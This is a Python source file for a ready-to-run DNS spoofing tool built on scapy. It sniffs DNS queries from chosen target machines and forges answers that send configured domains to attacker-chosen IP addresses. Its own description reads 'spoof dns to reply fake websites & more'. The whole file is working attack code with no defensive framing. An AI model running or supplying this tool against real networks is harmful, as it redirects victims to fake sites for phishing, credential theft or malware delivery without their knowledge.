import \
        os, sys, json, \
        argparse, socket, threading, \
        re, logging, ipaddress
from scapy.all import *


logger = logging.getLogger(__file__)


class DnsSpoofer:
    def __init__(self, targets, domains, interface):
        self.targets = targets
        self.domains = domains
        self.interface = interface

    def get_filter(self):
        filter = ''

        if self.targets:
            for i, target in enumerate(self.targets):
                filter += f'src host {target}'
                
                if i < (len(self.targets) - 1):
                    filter += ' or '
            filter += ' and '
        filter += 'dst port 53'
        return filter

    def send_query(self, dst, pkt):
        pkt_rr_type = 1 if ipaddress.ip_address(dst).version == 4 else 28
        rpkt = (
                Ether(dst=pkt[Ether].src, src=pkt[Ether].dst)/
                IP(dst=pkt[IP].src, src=pkt[IP].dst)/
                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/
                DNS(id=pkt[DNS].id, qr=1, ancount=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=dst, type=pkt_rr_type, ttl=3000))
            )
        sendp(rpkt, iface=self.interface, verbose=0)
        logging.info('spoofed DNS packet sended to %s (redirected to %s)' %(pkt[IP].src, dst))

    def packet_handler(self, pkt):
        requested_domain = str(pkt.qd.qname, encoding='utf-8')
       
        print('requested', requested_domain)
        for dst, domains in self.domains.items():
            for domain in domains:

                if re.search(domain, requested_domain):
                    logging.info('domain match for %s, redirecting to %s (target %s)' %(requested_domain, dst, pkt[IP].src))
                    return self.send_query(dst, pkt)

    def start(self):
        filter_string = self.get_filter()

        logger.info('dns service spoofing started (port: 53)')
        sniff(prn=self.packet_handler, filter=filter_string, store=0, iface=self.interface)


def main(namespace):
    config_file = namespace.config
    stream_handler = logging.StreamHandler(sys.stdout)
    stream_handler.setFormatter(logging.Formatter('[%(asctime)s][%(levelname)s] %(message)s'))

    logger.setLevel(namespace.logging_level)
    logger.addHandler(stream_handler)

    if not os.path.exists(config_file):
        raise FileNotFoundError('could not find %s config file' %config_file)

    with open(config_file, 'r') as fp:
        config = json.load(fp)

    config.setdefault('targets', [])
    config.setdefault('domains', {})
    config.setdefault('interface', namespace.interface)
    logger.debug('config: ' + json.dumps(config, indent=4))

    dns_spoofer = DnsSpoofer(**config)
    dns_spoofer.start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="spoof dns to reply fake websites & more...")
    parser.add_argument('--config', type=str, default='dumbns.config.json', help='config file name')
    parser.add_argument('-i', '--interface', type=str, help='interface to listen to (check ur interface with "ip links")')
    parser.add_argument('--logging-level', type=int, default=logging.INFO, help='set logging level (python numeric value https://docs.python.org/3/library/logging.html#logging-levels)')

    main(parser.parse_args(sys.argv[1:]))
